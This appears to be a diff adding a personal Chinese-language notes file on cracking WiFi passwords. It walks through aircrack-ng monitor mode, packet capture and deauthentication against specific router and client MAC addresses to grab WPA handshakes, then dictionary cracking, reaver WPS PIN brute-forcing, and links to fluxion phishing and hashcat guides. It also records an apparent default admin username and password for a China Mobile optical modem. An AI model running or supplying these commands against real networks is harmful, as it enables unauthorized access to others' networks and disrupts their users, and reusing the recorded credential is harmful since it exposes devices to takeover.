@@ -1,0 +1,182 @@
+破解wifi密码
+
+
+选择特殊USB网卡， 8187L ,RT3070 . 有监听功能，，
+
+启动Linux mint 。打开终端窗口。并执行以下步骤。
+
+
+
+sudo apt install  aircrack-ng      ######
+
+
+步骤1：ifconfig（接口配置）：查看或更改系统上网络接口的配置。
+
+ifconfig -a                       iwconfig  ####             iw list   airmon-ng
+
+wlan0：系统上的第一个无线网络接口。（这就是我们需要的。）
+
+步骤2：停止当前使用WiFi接口的进程。
+
+sudo airmon-ng check kill   ###########
+
+步骤3：在监控模式下启动wlan0 。
+
+sudo airmon-ng start wlx000d18302a4a   ########### 
+
+ rfkill list   #########
+
+          0: phy0: Wireless LAN
+                        Soft blocked: no
+                        Hard blocked: no   *****
+
+ rfkill unblock 0
+
+正常情况下，网卡为manage模式，有两种方式开启monitor模式
+
+利用iw开启monitor模式：iw dev wlan0 interface add wlan0mon type monitor
+
+     sudo service network-manager start 
+===========================================
+从无线模块的显示列表可以看出，序号2的wifi模块是软硬件是可以启动的，所以，只要将前面默认的模块移出即可；使用命令：
+
+sudo modprobe -r ideapad_laptop    *********
+即移出了ideapad的无线模块，再reboot,WIFI模块工作正常 rfkill list     Hard blocked: no
+
+
+
+
+================================================
+步骤4：查看您周围的所有Wifi网络。
+
+sudo airodump-ng wlan0mon   ###########
+
+    airodump-ng：用于数据包捕获wlan0mon：接口名称（此名称在不同设备上可以不同）
+
+找到目标网络后，按Ctrl + C可以停止该过程。
+
+步骤5：查看连接到目标网络的客户端。
+
+sudo airodump-ng -c 6 --bssid 80:EA:07:BD:B0:07 -w  TP-LINK_B007 wlan0mon     ######
+
+
+-----------------------------------------------------------
+
+
+sudo airodump-ng -c 11 --bssid A8:57:4E:61:D8:DC -w  CMCC-7UYF wlan0mon 
+
+sudo aireplay-ng -0 10 -a  A8:57:4E:61:D8:DC wlan0mon
+
+sudo aireplay-ng -0 10 -a  A8:57:4E:61:D8:DC -c 20:EE:28:4A:A8:CF wlan0mon
+
+---------------------------------------------------------------------
+
+
+
+sudo wash -i wlan0mon
+
+
+步骤6：打开一个新的终端窗口以断开连接到目标网络的客户端。
+
+sudo aireplay-ng -0 10 -a  80:EA:07:BD:B0:07 wlan0mon      ########
+
+sudo aireplay-ng -0 10 -a A8:57:4E:61:D8:DC -c 20:EE:28:4A:A8:CF wlan0mon
+
+ireplay-ng：注入帧-0：用于取消认证10：发送的去认证报文数
+-a：对于目标网络的bssid
+-c: 目标手机
+wlan0mon：接口名称。
+
+客户端与目标网络断开连接时。他尝试重新连接到网络，当他这样做时，您将在终端的上一个窗口中得到称为WPA握手的信息。
+
+现在，我们完成了捕获数据包的工作。因此，现在您可以关闭终端窗口。
+
+
+步骤7.解密密码。打开文件应用程序。
+/home/hacking-01.cap      ########
+
+    hacking-01.cap是您需要的文件。
+aircrack-ng -a2 -b 80：35：C1：13：C1：2C -w /root/passwords.txt /root/hacking-01.cap
+
+aircrack-ng：802.11WEP和WPA-PSK密钥破解程序-a：用于WPA2的-a2和-用于WPA网络的-a-b：目标网络的BSSID-w：单词表文件的位置/root/hacking-01.cap：cap文件的位置
+
+您可以从互联网上下载常用密码文件，如果要创建自己的文件，则可以使用紧缩工具
+
+
+===================================================================
+
+已淘汰 reaver
+sudo reaver -i wlan0mon -b A8:57:4E:61:D8:DC -a -c 11 -e CMCC-7UYF -l 60 -S -vv
+
+sudo reaver -i wlan0mon -b E4:47:B3:2B:B7:8C -c 8 -vv -S     -A  -F  -l 60
+
+
+https://github.com/t6x/reaver-wps-fork-t6x
+
+
+https://github.com/ChunshengZhao/inflator
+Build steps:
+sudo apt-get install fluid
+sudo fluid -c inflator.fl
+sudo fltk-config --compile inflator.cxx
+sudo ./inflator
+
+
+
+-----------------------------------------------------
+fluxion就是利用了钓鱼的方法来伪造登录界面进行入侵。
+https://github.com/FluxionNetwork/fluxion
+
+
+
+
+为什么说这个方法推荐使用呢？因为他只作用于当前终端中，不会影响环境，而且命令比较简单
+
+在终端中直接运行：
+如果是https那么就经过如下命令：
+
+export https_proxy=http://127.0.0.1:8580
+
+移动吉比特GM619光猫
+账号:CMCCAdmin密码:aDm8H%MdA
+
+
+
+--------------------------------------------------
+
+https://www.bilibili.com/read/cv9131435
+三分钟，快速入狱教程，之如何迅速破解WiFi密码 
+hashcat是一款很强大的密码破解工具，不仅可以破解WiFi密码，还可以破解电脑系统、压缩包、文档等密码，破解方式除字典破解以外，也有很多种。
+
+
+https://cdn.modb.pro/db/122207
+如何高速猜出破解wifi密码？hashcat运用（超详细）
+将cap转换为hashcat能够破解的形式
+
+https://blog.csdn.net/weixin_43798572/article/details/122554100
+Python pywifi 、Kali linux aircrack-n、Hashcat 【python、kali】破解无线WiFi密码（详细流程）
+
+https://zhuanlan.zhihu.com/p/53268033
+周叔讲信息安全-2、wifi网络安全原理及防范       ############
+
+目前，最为简约和可靠的方式是用cdlinux抓取数据包，然后把握手包拿到windows下用显卡跑包。
+
+第一种方法：EWSA跑握手包。
+EWSA破解的难点其实不在具体的破解业务上，难点在EWSA程序本身，因为这个程序是个商业软件，是要付费购买的，而且价格不菲，大多数人都是想到去找破解版，而现在网上的破解版基本都是不能用的，要么就是报错和系统不兼容，要么就是不显示显卡。
+第二种方法：用wifipr软件跑包。
+这也是一个付费软件，和EWSA差不多，都是使用显卡来跑包，操作上也是和EWSA非常相近，但是这个软件相比EWSA有一个非常大的优点。就是这个软件的破解版在网上非常容易找到，而且兼容性要比EWSA的破解版好的多，所以第二种方法中我们推荐使用这个软件。
+第三种方法：hashcat跑包。
+Hashcat也是这样，这个软件只提供命令行版本的程序，kali系统自带个软件，可以直接在shell中使用，其它的系统要去官方网站下载这个软件再使用。
+对于软件的安装非常简单，在windows下只需要打开下载的软件包，直接用命令行运行即可，不需要安装步骤。
+所以新版的hashcat中要求提供的包格式为了hccapx。故在使用hashcat跑包之前我们需要用工具将cap的握手包转换为hccapx的包。
+将抓到的.cap格式的握手包上传hashcat官网提供的在线格式转换工具  https://hashcat.net/cap2hashcat/
+
+
+关于PIN破解，这里有一个限制，就是一些老的路由器才会存在这个漏洞，现在市场的路由器基本上已经做了防PIN设置，PIN破解对于这些路由器无效。
+对于PIN破解的实操方法最简单的就是用CDlinux的小水滴破解程序minidwep-gtk，它在扫描到无线AP后会首先启用PIN破解。
+
+
+
+https://zhuanlan.zhihu.com/p/24803690
+Reaver基本命令参数详解及应用
+reaver –i mon0 –b MAC –a –S –vv –d 3 –t 3 //开始穷举PIN码
